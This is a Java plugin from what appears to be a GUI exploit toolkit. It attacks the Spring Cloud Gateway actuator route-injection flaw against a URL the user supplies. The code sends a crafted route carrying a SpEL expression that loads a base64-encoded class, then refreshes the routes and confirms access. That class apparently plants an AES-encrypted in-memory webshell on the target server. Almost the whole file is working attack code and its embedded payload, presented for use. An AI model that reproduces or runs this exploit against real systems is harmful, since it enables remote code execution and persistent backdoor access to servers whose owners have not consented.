package org.jiu.exploit.springbaldex;

import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;
import org.jiu.form.CommandForm;
import org.jiu.templates.TabContent;
import org.jiu.utils.ProxyManager;
import org.jiu.utils.Utils;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.util.HashMap;

public class springgatewayRCE  implements TabContent {
    private JTabbedPane tabbedPane;
    private CommandForm commandForm;
    private String url;
    private String command;
    private HashMap<String, String> headers = new HashMap<>();

    // 修改下面参数
    public String name = "springgatewayRCE"; // 漏洞名
    public String product = "Command";             // 类型
    public String desc = "springgateway 打spring gateway 内存马";  // 描述
    public String author = "xm17";              // 作者
    public String className = "org.jiu.exploit.springbaldex.springgatewayRCE"; // 类名(必须)
    public String tabName = "springgateway 打spring gateway 内存马";  // tab显示名称
    public String tips = "直接执行即可注入内存马,如果访问地址为/api/gateway/,请拼接地址/api/";    // 提示



    public springgatewayRCE() {
    }

    public springgatewayRCE(JTabbedPane tabbedPane) {
        this.tabbedPane = tabbedPane;
    }

    @Override
    public void init() {
        commandForm = new CommandForm();
    }

    @Override
    public JPanel getPanel() {
        return commandForm.CommandForm;
    }

    @Override
    public String getTabName() {
        return tabName;
    }

    public void setTabbedPane(JTabbedPane tabbedPane) {
        this.tabbedPane = tabbedPane;
    }


    @Override
    public void exploit() {
        // 提示一下怎么用
        commandForm.tipsLabel.setText(tips);

        // Use an array to hold the SwingWorker reference
        final SwingWorker[] worker = new SwingWorker[1];
        String randomString = Utils.generateRandomString(4);
        commandForm.startButton.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // Create and execute the background task
                worker[0] = new SwingWorker<String, Void>() {
                    @Override
                    protected String doInBackground() throws Exception {
                        url = Utils.removeTrailingSlash(commandForm.urlField.getText());
                        headers = Utils.getHeaders(commandForm.headerTextArea.getText());
                        // header看情况添加,外部控制的主要是鉴权
                        headers.put("Content-Type", "application/json;charset=UTF-8");

                        StringBuilder resultOutPrint = new StringBuilder();

                        try {
                            // 接下来写实现发包逻辑
                            // 创建路由
                            RawResponse rawResponse = Requests.post(url + "/actuator/gateway/routes/"+randomString)
                                    .verify(false)
                                    .headers(headers)
                                    .proxy(ProxyManager.Proxy())
                                    .timeout(10)
                                    .body(String.format("{\"predicates\":[{\"name\":\"Path\",\"args\":{\t\"_genkey_0\":\"/%s/**\"}}],  \"id\": \"%s\",  \"filters\": [{    \"name\": \"AddResponseHeader\",    \"args\": {      \"name\": \"Result\",      \"value\": \"#{T(org.springframework.cglib.core.ReflectUtils).defineClass('SpringWebfluxHandlerMemShell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQBWwoAYwCRBwCSCgACAJEJABIAkwoAAgCUCQASAJUKAAIAlgoAEgCXCQASAJgKAA0AmQgAmgcAmwcAnAcAnQcAngoADACfCgAOAKAHAKEIAIEHAKIHAKMKAA8ApAsApQCmCgASAJEKAA4ApwgAqAcAqQoAGwCqCACrBwCsBwCtCgCuAK8KAK4AsAoAHgCxBwCyCAB1BwCzCQC0ALUKALQAtggAtwoAuAC5BwC6CgAVALsKACoAvAoAuAC9CgC4AL4IAL8KAMAAwQoAFQDCCgDAAMMHAMQKAMAAxQoAMwDGCgAzAMcKABUAyAgAyQoADADKCADLBwDMCgAMAM0HAM4IAM8IANAKAAwA0QgA0ggA0wgA1AgA1QgA1gsAFADXEgAAAN0KAN4A3wcA4AkA4QDiCgBJAOMKABsA5AsA5QDmCgASAOcKABIA6AkAEgDpCADqCwDrAOwKABIA7QsA6wDuCADvBwDwCgBWAJEKAA0A8QoAFQDyCgANAJYKAFYA8woAEgD0CgAVAPUKAN4A9gcA9woAXwCRCAD4CAD5BwD6AQAFc3RvcmUBAA9MamF2YS91dGlsL01hcDsBAAlTaWduYXR1cmUBADVMamF2YS91dGlsL01hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDs+OwEABHBhc3MBABJMamF2YS9sYW5nL1N0cmluZzsBAANtZDUBAAJ4YwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAhkb0luamVjdAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAqQcAowEAC2RlZmluZUNsYXNzAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQAKRXhjZXB0aW9ucwEAAXgBAAcoW0JaKVtCBwChBwD7AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAAnh4AQBdKExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2ZXIvU2VydmVyV2ViRXhjaGFuZ2U7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7AQAZUnVudGltZVZpc2libGVBbm5vdGF0aW9ucwEANUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUG9zdE1hcHBpbmc7AQAFdmFsdWUBAAMveHgBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAPwBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQALbGFtYmRhJHh4JDABAEcoTG9yZy9zcHJpbmdmcmFtZXdvcmsvdXRpbC9NdWx0aVZhbHVlTWFwOylMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwcAkgEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEAIVNwcmluZ1dlYmZsdXhIYW5kbGVyTWVtU2hlbGwuamF2YQwAbABtAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAGgAaQwA/QD+DABrAGkMAP8BAAwAagB8DABqAGkMAQEBAgEAFXJlZ2lzdGVySGFuZGxlck1ldGhvZAEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwwBAwEEDAEFAQYBABxTcHJpbmdXZWJmbHV4SGFuZGxlck1lbVNoZWxsAQAwb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmVyL1NlcnZlcldlYkV4Y2hhbmdlAQAQamF2YS9sYW5nL1N0cmluZwwBBwEKBwELDAEMAQ0MAQ4BDwEAAm9rAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwBEABtAQAFZXJyb3IBABdqYXZhL25ldC9VUkxDbGFzc0xvYWRlcgEADGphdmEvbmV0L1VSTAcBEQwBEgETDAEUARUMAGwBFgEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAAltCBwEXDAEYARkMARoBGwEAA0FFUwcA+wwBHAEdAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwBHgEfDABsASAMASEBIgwBIwEkAQADTUQ1BwElDAEcASYMAScBKAwBKQEqAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMASsBHwwAbAEsDAD/AS0MAS4BAAEAEGphdmEudXRpbC5CYXNlNjQMAS8BMAEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMATEBBAEAE1tMamF2YS9sYW5nL09iamVjdDsBAA5lbmNvZGVUb1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMATIBMwEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyDAE0ATUBABBCb290c3RyYXBNZXRob2RzDwYBNhABNw8HATgQAIwMATkBOgcBOwwBPAE9AQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5BwE+DAE/AUAMAGwBQQwBQgEABwFDDAFEATcMAH8AgAwAeAB5DABkAGUBAAdwYXlsb2FkBwFFDAFGATcMAHUAdgwBRwFIAQAKcGFyYW1ldGVycwEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAFJAUoMAUsBTAwBTQEfDAB9AH4MAUsBLQwBTgFPAQARamF2YS91dGlsL0hhc2hNYXABAARwQVMzAQAQM2M2ZTBiOGE5YzE1MjI0YQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAFcGF0aHMBAAdCdWlsZGVyAQAMSW5uZXJDbGFzc2VzAQBgKFtMamF2YS9sYW5nL1N0cmluZzspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXI7AQBJb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcgEABWJ1aWxkAQBFKClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBACkoW0xqYXZhL25ldC9VUkw7TGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAC2dldEZvcm1EYXRhAQAfKClMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwoBUAFRAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsKABIBUgEABWFwcGx5AQA9KExTcHJpbmdXZWJmbHV4SGFuZGxlck1lbVNoZWxsOylMamF2YS91dGlsL2Z1bmN0aW9uL0Z1bmN0aW9uOwEAG3JlYWN0b3IvY29yZS9wdWJsaXNoZXIvTW9ubwEAB2ZsYXRNYXABADwoTGphdmEvdXRpbC9mdW5jdGlvbi9GdW5jdGlvbjspTHJlYWN0b3IvY29yZS9wdWJsaXNoZXIvTW9ubzsBACNvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1cwEAAk9LAQAlTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOwEAOihMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7KVYBAApnZXRNZXNzYWdlAQAmb3JnL3NwcmluZ2ZyYW1ld29yay91dGlsL011bHRpVmFsdWVNYXABAAhnZXRGaXJzdAEADWphdmEvdXRpbC9NYXABAANnZXQBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b0J5dGVBcnJheQEABGp1c3QBADEoTGphdmEvbGFuZy9PYmplY3Q7KUxyZWFjdG9yL2NvcmUvcHVibGlzaGVyL01vbm87BwFTDAFUAVcMAIsAjAEAImphdmEvbGFuZy9pbnZva2UvTGFtYmRhTWV0YWZhY3RvcnkBAAttZXRhZmFjdG9yeQcBWQEABkxvb2t1cAEAzChMamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cDtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL2ludm9rZS9NZXRob2RUeXBlO0xqYXZhL2xhbmcvaW52b2tlL01ldGhvZFR5cGU7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlO0xqYXZhL2xhbmcvaW52b2tlL01ldGhvZFR5cGU7KUxqYXZhL2xhbmcvaW52b2tlL0NhbGxTaXRlOwcBWgEAJWphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcyRMb29rdXABAB5qYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMAIQASAGMAAAAEAAkAZABlAAEAZgAAAAIAZwAJAGgAaQAAAAkAagBpAAAACQBrAGkAAAAMAAEAbABtAAEAbgAAAB0AAQABAAAABSq3AAGxAAAAAQBvAAAABgABAAAAFAAJAHAAcQABAG4AAADwAAcABgAAAJC7AAJZtwADsgAEtgAFsgAGtgAFtgAHuAAIswAJKrYAChILBr0ADFkDEg1TWQQSDlNZBRIPU7YAEE4tBLYAERISEhMEvQAMWQMSFFO2ABA6BAS9ABVZAytTuAAWuQAXAQA6BS0qBr0ADVkDuwASWbcAGFNZBBkEU1kFGQVTtgAZVxIaTacAC04ttgAcEh1NLLAAAQAAAIMAhgAbAAIAbwAAADIADAAAABsAHAAcADkAHQA+AB4AUAAfAGIAIACAACEAgwAlAIYAIgCHACMAiwAkAI4AJgByAAAADgAC9wCGBwBz/AAHBwB0AAoAdQB2AAIAbgAAAHgABgADAAAAVLsAHlkDvQAfuAAgtgAhtwAiTBIjEiQGvQAMWQMSJVNZBLIAJlNZBbIAJlO2ABBNLAS2ABEsKwa9AA1ZAypTWQQDuAAnU1kFKr64ACdTtgAZwAAMsAAAAAEAbwAAABIABAAAACsAEgAsAC8ALQA0AC4AdwAAAAQAAQAbAAEAeAB5AAEAbgAAAJ0ABgAEAAAAKxIouAApTi0cmQAHBKcABAW7ACpZsgAGtgArEii3ACy2AC0tK7YALrBOAbAAAQAAACcAKAAbAAIAbwAAABYABQAAADMABgA0ACIANQAoADYAKQA3AHIAAAA8AAP/AA8ABAcAegcAJQEHAHsAAQcAe/8AAAAEBwB6BwAlAQcAewACBwB7Af8AFwADBwB6BwAlAQABBwBzAAkAagB8AAEAbgAAAIEABAADAAAAMAFMEi+4ADBNLCq2ACsDKrYAMbYAMrsAM1kELLYANLcANRAQtgA2tgA3TKcABE0rsAABAAIAKgAtABsAAgBvAAAAHgAHAAAAPAACAD8ACABAABUAQQAqAEMALQBCAC4ARAByAAAAEwAC/wAtAAIHAHQHAHQAAQcAcwAACQB9AH4AAgBuAAAA+wAGAAUAAAB4AUwSOLgAOU0sEjoBwAA7tgA8LAHAAD22ABlOLbYAChI+BL0ADFkDEiVTtgA8LQS9AA1ZAypTtgAZwAAVTKcAOU4SP7gAOU0stgBAOgQZBLYAChJBBL0ADFkDEiVTtgA8GQQEvQANWQMqU7YAGcAAFUynAAU6BCuwAAIAAgA9AEAAGwBBAHEAdAAbAAIAbwAAADIADAAAAEgAAgBMAAgATQAbAE4APQBWAEAATwBBAFEARwBSAE0AUwBxAFUAdABUAHYAWAByAAAAKQAD/wBAAAIHACUHAHQAAQcAc/8AMwAEBwAlBwB0AAcAcwABBwBz+QABAHcAAAAEAAEAGwAJAH8AgAACAG4AAAEHAAYABQAAAIQBTBI4uAA5TSwSQgHAADu2ADwsAcAAPbYAGU4ttgAKEkMEvQAMWQMSFVO2ADwtBL0ADVkDKlO2ABnAACXAACXAACVMpwA/ThJEuAA5TSy2AEA6BBkEtgAKEkUEvQAMWQMSFVO2ADwZBAS9AA1ZAypTtgAZwAAlwAAlwAAlTKcABToEK7AAAgACAEMARgAbAEcAfQCAABsAAgBvAAAAMgAMAAAAXAACAGAACABhABsAYgBDAGoARgBjAEcAZQBNAGYAUwBnAH0AaQCAAGgAggBsAHIAAAApAAP/AEYAAgcAdAcAJQABBwBz/wA5AAQHAHQHACUABwBzAAEHAHP5AAEAdwAAAAQAAQAbACEAgQCCAAIAbgAAAGQABAADAAAALCu5AEYBACq6AEcAALYASE27AElZLLIASrcAS7BNuwBJWSy2AEyyAEq3AEuwAAEAAAAbABwAGwACAG8AAAASAAQAAABzABAAigAcAIsAHQCMAHIAAAAGAAFcBwBzAIMAAAAOAAEAhAABAIVbAAFzAIYAAQCHAIgAAgBuAAAAGQAAAAMAAAABsQAAAAEAbwAAAAYAAQAAAJMAdwAAAAQAAQCJAAEAhwCKAAIAbgAAABkAAAAEAAAAAbEAAAABAG8AAAAGAAEAAACYAHcAAAAEAAEAiRACAIsAjAABAG4AAAFAAAQABwAAAMC7AAJZtwADTSuyAAS5AE0CAMAAFU4qLbgATgO2AE86BLIAUBJRuQBSAgDHABayAFASURkEuABTuQBUAwBXpwBusgBQElUZBLkAVAMAV7sAVlm3AFc6BbIAUBJRuQBSAgDAAAy2AEA6BhkGGQW2AFhXGQYZBLYAWFcssgAJAxAQtgBZtgAFVxkGtgBaVywqGQW2AFsEtgBPuABctgAFVyyyAAkQELYAXbYABVenAA1OLC22AEy2AAVXLLYAB7gAXrAAAQAIAKsArgAbAAIAbwAAAEoAEgAAAHQACAB2ABUAdwAgAHgALQB5AEAAewBNAHwAVgB9AGgAfgBwAH8AeACAAIYAgQCMAIIAngCDAKsAhwCuAIUArwCGALgAiAByAAAAFgAE/gBABwCNBwB0BwAl+QBqQgcAcwkACACOAG0AAQBuAAAAMQACAAAAAAAVuwBfWbcAYLMAUBJhswAEEmKzAAaxAAAAAQBvAAAACgACAAAAFQAKABYAAwCPAAAAAgCQAQkAAAASAAIApQAPAQgGCQFVAVgBVgAZANgAAAAMAAEA2QADANoA2wDc'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping, '/%s')}\"    }  }],  \"uri\": \"http://test.com\"}",randomString,randomString,randomString))
                                    .send();
                            resultOutPrint.append(rawResponse.readToText()).append("新增路由完成\n\n");
                            resultOutPrint.append(rawResponse.readToText()).append("\n\n==========================\n\n");

                            RawResponse rawResponse1 = Requests.post(url + "/actuator/gateway/refresh")
                                    .verify(false)
                                    .headers(headers)
                                    .timeout(10)
                                    .proxy(ProxyManager.Proxy())
                                    .send();
                            resultOutPrint.append(rawResponse1.readToText()).append("\n\n==========================\n\n");

                            RawResponse rawResponse2 = Requests.post(url + "/"+randomString)
                                    .verify(false)
                                    .timeout(10)
                                    .proxy(ProxyManager.Proxy())
                                    .headers(headers)
                                    .send();
                            resultOutPrint.append(rawResponse2.readToText()).append("\n\n==========================\n\n");

                            if (rawResponse2.statusCode() == 200){
                                resultOutPrint.append("访问地址: " +url+"/"+randomString);
                                resultOutPrint.append("注入内存马成功");
                            }

                        } catch (Exception ex) {
                            return "失败: " + ex.getMessage();
                        }

                        return resultOutPrint.toString();
                    }

                    @Override
                    protected void done() {
                        try {
                            String result = get(); // 获取结果
                            commandForm.resultArea.setText(result);
                        } catch (Exception ex) {
                            commandForm.resultArea.setText("出现错误: " + ex.getMessage());
                        }
                    }
                };

                worker[0].execute(); // 执行任务
            }
        });

        // 添加停止按钮的逻辑
        commandForm.stopButton.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // 停止上传的逻辑
                if (worker[0] != null) {
                    worker[0].cancel(true); // 取消上传操作
                    commandForm.resultArea.setText("已被停止。");
                }
            }
        });
    }
}
